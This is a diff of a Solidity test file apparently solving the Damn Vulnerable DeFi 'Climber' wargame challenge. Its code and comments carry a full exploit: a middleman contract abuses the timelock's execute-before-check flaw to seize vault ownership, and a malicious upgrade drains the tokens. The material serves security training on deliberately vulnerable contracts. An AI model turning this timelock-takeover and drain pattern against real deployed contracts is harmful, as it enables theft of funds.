@@ -4,26 +4,24 @@ pragma solidity 0.8.10;
 import {Utilities} from "../utils/Utilities.sol";
 import {BaseTest} from "../BaseTest.sol";
 
-import "../../DamnValuableToken.sol";
-import "../../climber/ClimberTimelock.sol";
-import "../../climber/ClimberVault.sol";
+import "../../src/DamnValuableToken.sol";
+import "../../src/climber/ClimberTimelock.sol";
+import "../../src/climber/ClimberVault.sol";
 
 import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import "openzeppelin-contracts/token/ERC20/IERC20.sol";
 
 contract ClimberTest is BaseTest {
-
     uint256 constant VAULT_TOKEN_BALANCE = 10_000_000 ether;
 
     address payable attacker;
     address payable deployer;
     address payable proposer;
     address payable sweeper;
-    
+
     ClimberVault vault;
     ClimberTimelock vaultTimelock;
     DamnValuableToken token;
-
 
     constructor() {
         string[] memory labels = new string[](4);
@@ -52,7 +50,12 @@ contract ClimberTest is BaseTest {
         ClimberVault vaultImplementation = new ClimberVault();
         vm.label(address(vaultImplementation), "ClimberVault Implementation");
 
-        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
+        bytes memory data = abi.encodeWithSignature(
+            "initialize(address,address,address)",
+            deployer,
+            proposer,
+            sweeper
+        );
         ERC1967Proxy vaultProxy = new ERC1967Proxy(
             address(vaultImplementation),
             data
@@ -69,8 +72,14 @@ contract ClimberTest is BaseTest {
         vaultTimelock = ClimberTimelock(payable(vault.owner()));
         vm.label(address(vaultTimelock), "ClimberTimelock");
 
-        assertEq(vaultTimelock.hasRole(vaultTimelock.PROPOSER_ROLE(), proposer), true);
-        assertEq(vaultTimelock.hasRole(vaultTimelock.ADMIN_ROLE(), deployer), true);
+        assertEq(
+            vaultTimelock.hasRole(vaultTimelock.PROPOSER_ROLE(), proposer),
+            true
+        );
+        assertEq(
+            vaultTimelock.hasRole(vaultTimelock.ADMIN_ROLE(), deployer),
+            true
+        );
 
         // Deploy token and transfer initial token balance to the vault
         token = new DamnValuableToken();
@@ -79,15 +88,12 @@ contract ClimberTest is BaseTest {
         vm.stopPrank();
     }
 
-    
     function test_Exploit() public {
         runTest();
     }
 
     function exploit() internal override {
         /** CODE YOUR EXPLOIT HERE */
-
-        
 
         // SCENARIO 1: become the sweeper
         // it seems not possible, the `_setSweeper` function is `internal` so cannot be called externally
@@ -103,7 +109,7 @@ contract ClimberTest is BaseTest {
 
         // The current owner of the Vault is the Timelock itself
         // This mean that only the Timelock can call `vault.transferOwnership` to change the ownership
-        // In order to be able to execute all these function from the Timelock the PROPOSER 
+        // In order to be able to execute all these function from the Timelock the PROPOSER
         // must schedule an operation containing them and someone (anyone) have to execute that bulk operation
 
         // Is there a way to call the `schedule` function directly without being the PROPOSER? It does not seems so
@@ -143,17 +149,30 @@ contract ClimberTest is BaseTest {
         // set the attacker as the owner of the vault as the first operation
         targets[0] = address(vault);
         values[0] = 0;
-        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);
+        dataElements[0] = abi.encodeWithSignature(
+            "transferOwnership(address)",
+            attacker
+        );
 
         // grant the PROPOSER role to the middle man contract will schedule the operation
         targets[1] = address(vaultTimelock);
         values[1] = 0;
-        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", vaultTimelock.PROPOSER_ROLE(), address(middleman));
+        dataElements[1] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            vaultTimelock.PROPOSER_ROLE(),
+            address(middleman)
+        );
 
         // call the external middleman contract to schedule the operation with the needed data
         targets[2] = address(middleman);
         values[2] = 0;
-        dataElements[2] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)", attacker, address(vault), address(vaultTimelock), salt);
+        dataElements[2] = abi.encodeWithSignature(
+            "scheduleOperation(address,address,address,bytes32)",
+            attacker,
+            address(vault),
+            address(vaultTimelock),
+            salt
+        );
 
         // anyone can call the `execute` function, there's no auth check over there
         vm.prank(attacker);
@@ -188,12 +207,18 @@ contract ClimberTest is BaseTest {
 }
 
 contract Middleman {
-
-    function scheduleOperation(address attacker, address vaultAddress, address vaultTimelockAddress, bytes32 salt) external {
+    function scheduleOperation(
+        address attacker,
+        address vaultAddress,
+        address vaultTimelockAddress,
+        bytes32 salt
+    ) external {
         // Recreate the scheduled operation from the Middle man contract and call the vault
         // to schedule it before it will check (inside the `execute` function) if the operation has been scheduled
         // This is leveraging the existing re-entrancy exploit in `execute`
-        ClimberTimelock vaultTimelock = ClimberTimelock(payable(vaultTimelockAddress));
+        ClimberTimelock vaultTimelock = ClimberTimelock(
+            payable(vaultTimelockAddress)
+        );
 
         address[] memory targets = new address[](3);
         uint256[] memory values = new uint256[](3);
@@ -202,32 +227,45 @@ contract Middleman {
         // set the attacker as the owner
         targets[0] = vaultAddress;
         values[0] = 0;
-        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);
+        dataElements[0] = abi.encodeWithSignature(
+            "transferOwnership(address)",
+            attacker
+        );
 
         // set the attacker as the owner
         targets[1] = vaultTimelockAddress;
         values[1] = 0;
-        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", vaultTimelock.PROPOSER_ROLE(), address(this));
+        dataElements[1] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            vaultTimelock.PROPOSER_ROLE(),
+            address(this)
+        );
 
         // create the proposal
         targets[2] = address(this);
         values[2] = 0;
-        dataElements[2] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)",attacker, vaultAddress, vaultTimelockAddress, salt);
+        dataElements[2] = abi.encodeWithSignature(
+            "scheduleOperation(address,address,address,bytes32)",
+            attacker,
+            vaultAddress,
+            vaultTimelockAddress,
+            salt
+        );
 
         vaultTimelock.schedule(targets, values, dataElements, salt);
     }
-
 }
 
 contract PawnedClimberVault is ClimberVault {
-
     /// @custom:oz-upgrades-unsafe-allow constructor
     constructor() initializer {}
 
     function withdrawAll(address tokenAddress) external onlyOwner {
         // withdraw the whole token balance from the contract
         IERC20 token = IERC20(tokenAddress);
-        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
+        require(
+            token.transfer(msg.sender, token.balanceOf(address(this))),
+            "Transfer failed"
+        );
     }
-
 }
